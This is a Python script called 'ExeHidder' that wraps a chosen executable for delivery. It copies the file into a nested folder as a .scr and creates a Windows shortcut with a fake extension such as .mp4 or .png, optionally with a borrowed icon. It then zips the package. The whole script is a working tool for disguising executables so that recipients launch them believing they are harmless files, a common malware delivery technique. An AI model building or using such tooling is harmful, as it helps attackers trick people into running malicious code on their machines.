import winshell
import os
import win32com.client
import time
import shutil
import zipfile

def create_shortcut_cmd(shortcut_path, target_file):
    with winshell.shortcut(shortcut_path) as shortcut:
        shortcut.path = target_file
        shortcut.working_directory = os.path.dirname(target_file)
        shortcut.description = "Generated by ExeHidder"
        print(f"Shortcut created at: {shortcut_path}")

def change_shortcut_icon(shortcut_path, icon_path, icon_index=0):
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.IconLocation = f"{icon_path},{icon_index}"
    shortcut.Save()

def printLogo():
    print('''
▒█▀▀▀ █░█ █▀▀ ▒█░▒█ ░▀░ █▀▀▄ █▀▀▄ █▀▀ █▀▀█ 
▒█▀▀▀ ▄▀▄ █▀▀ ▒█▀▀█ ▀█▀ █░░█ █░░█ █▀▀ █▄▄▀ 
▒█▄▄▄ ▀░▀ ▀▀▀ ▒█░▒█ ▀▀▀ ▀▀▀░ ▀▀▀░ ▀▀▀ ▀░▀▀''')

def create_ntws_lib_with_exe(base_folder, exe_path, exe_name):
    ntws_folder = os.path.join(base_folder, "ntws")
    lib_folder = os.path.join(ntws_folder, "lib")
    os.makedirs(lib_folder, exist_ok=True)

    # Rename the file to match the shortcut name with .scr extension
    exe_target_path = os.path.join(lib_folder, f"{exe_name}.scr")
    shutil.copy2(exe_path, exe_target_path)

    return exe_target_path

if __name__ == "__main__":
    os.system("color 2")
    printLogo()
    print("\n\n")

    print("Enter the exe file you want to package")
    target_file = input().strip()
    while not os.path.isfile(target_file):
        print("Invalid file path. Try again.")
        target_file = input().strip()

    print("Enter the directory where the package will be created")
    out_dir = input().strip()
    while not os.path.isdir(out_dir):
        print("Invalid directory path. Try again.")
        out_dir = input().strip()

    print("Enter the fake extension you want for the shortcut (e.g. .mp4, .png, .txt)")
    fake_ext = input().strip()

    print("Enter the name of the shortcut file (without extension)")
    shortcut_name = input().strip()

    print("Enter path to an ico/exe for the shortcut icon, or 'none'")
    ico_path = input().strip()
    if ico_path.lower() == "none":
        ico_path = None

    print("Enter the name you want for the final zip file (without extension)")
    zip_name = input().strip()

    
    base_name = os.path.splitext(os.path.basename(target_file))[0]
    package_folder = os.path.join(out_dir, base_name + "_package")
    os.makedirs(package_folder, exist_ok=True)

    # ntws/lib folder and exe path 
    exe_target_path = create_ntws_lib_with_exe(package_folder, target_file, shortcut_name)

    # shortcut pointing to exe
    shortcut_path = os.path.join(package_folder, f"{shortcut_name}{fake_ext}.lnk")
    create_shortcut_cmd(shortcut_path, exe_target_path)

    if ico_path and os.path.isfile(ico_path):
        change_shortcut_icon(shortcut_path, ico_path)

    # zip creation
    zip_path = os.path.join(out_dir, f"{zip_name}.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(package_folder):
            for file in files:
                abs_path = os.path.join(root, file)
                rel_path = os.path.relpath(abs_path, package_folder)
                zipf.write(abs_path, rel_path)

    print(f"\n✅ Done! Package created: {zip_path}")
    time.sleep(5)
